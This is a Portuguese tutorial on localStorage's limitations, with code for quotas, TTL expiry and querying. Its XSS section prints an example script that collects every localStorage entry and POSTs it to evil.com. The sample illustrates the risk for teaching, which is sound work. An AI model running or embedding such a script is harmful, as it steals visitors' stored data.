# FE03-70 — Limitações do LocalStorage

## O resumo das limitações

`localStorage` é simples e útil, mas tem restrições importantes que determinam quando usar — e quando buscar alternativas.

## 1. Só armazena strings

Todo valor vira `String` — objetos são destruídos sem `JSON.stringify`:

```javascript
localStorage.setItem("obj", { a: 1 });
localStorage.getItem("obj"); // "[object Object]" — perda total
```

Consequência: **não há tipos** — tudo volta como texto e você precisa de `JSON.parse`, `Number`, `Boolean` para recuperar a forma original.

## 2. Capacidade limitada (~5–10 MB)

O limite varia por navegador — mas é pequeno comparado a alternativas:

```javascript
// Estoura a quota — QuotaExceededError
const gigante = "x".repeat(6 * 1024 * 1024); // ~6 MB

try {
  localStorage.setItem("grande", gigante);
} catch (e) {
  console.error("Quota excedida:", e.name); // QuotaExceededError
}
```

Para volumes maiores: **IndexedDB** (centenas de MB) ou cache de API.

## 3. Operações síncronas — bloqueiam a thread

`localStorage` é síncrono: cada `getItem`/`setItem` trava a thread principal até terminar. Em leituras frequentes ou dados grandes, causa lag visual:

```javascript
// Em loops, o custo acumula
for (let i = 0; i < 1000; i++) {
  localStorage.setItem(`k${i}`, JSON.stringify(dados)); // 1000 escritas síncronas
}
```

Alternativa assíncrona: **IndexedDB** (não bloqueia) ou `Cache API`.

## 4. Sem indexação nem consultas

Não existe "buscar todos os itens com categoria X" — `localStorage` é um mapa chave-valor puro. Para consultas, você precisa carregar tudo e filtrar em memória:

```javascript
// ❌ Não existe isso
localStorage.where("categoria", "eletronicos");

// ✅ Carrega tudo, filtra em JS
const todos = JSON.parse(localStorage.getItem("produtos") || "[]");
const filtrados = todos.filter(p => p.categoria === "eletronicos");
```

## 5. Sem expiração nativa

Diferente de cookies, `localStorage` não expira sozinho. Para dados temporais, implemente TTL manual:

```javascript
function setComTTL(chave, valor, minutos) {
  const item = {
    valor,
    expira: Date.now() + minutos * 60 * 1000
  };
  localStorage.setItem(chave, JSON.stringify(item));
}

function getComTTL(chave) {
  const item = JSON.parse(localStorage.getItem(chave) || "null");
  if (!item) return null;
  if (Date.now() > item.expira) {
    localStorage.removeItem(chave);
    return null;
  }
  return item.valor;
}
```

## 6. Vulnerável a XSS

Qualquer script injetado na página pode ler todo o `localStorage`:

```javascript
// Script malicioso injetado via XSS rouba tudo
const roubo = {};
for (let i = 0; i < localStorage.length; i++) {
  const k = localStorage.key(i);
  roubo[k] = localStorage.getItem(k);
}
fetch("https://evil.com/roubar", { method: "POST", body: JSON.stringify(roubo) });
```

Nunca armazene tokens de sessão, senhas ou dados pessoais sensíveis.

## 7. Não compartilhado entre domínios diferentes

`meusite.com` e `sub.meusite.com` têm storages **separados** — cada origem é uma ilha. Para compartilhar entre subdomínios, cookies com `domain=.meusite.com` ou uma API central.

## 8. Modo anônimo pode falhar

Alguns navegadores permitem `localStorage` em aba anônima com quota reduzida ou comportamento volátil — os dados podem sumir ao fechar. Sempre proteja com `try/catch`.

## Quando usar cada solução

| Necessidade | Solução |
| --- | --- |
| Preferências, flags, rascunhos | `localStorage` |
| Dados por aba/sessão | `sessionStorage` |
| Autenticação segura | Cookies `HttpOnly` + `Secure` |
| Dados grandes + consultas | `IndexedDB` |
| Cache de assets/API | `Cache API` / Service Worker |
| Dados entre subdomínios | Cookies ou backend |

## Boas práticas compensatórias

- **Sempre serialize** — `JSON.stringify`/`JSON.parse`
- **Sempre proteja** — `try/catch` para quota e modo anônimo
- **Sempre valide** — dados do storage podem ser corrompidos pelo usuário
- **Prefira chaves namespaced** — `app:config`, `app:tarefas`
- **Não abuse** — se precisa de queries ou >5 MB, é IndexedDB
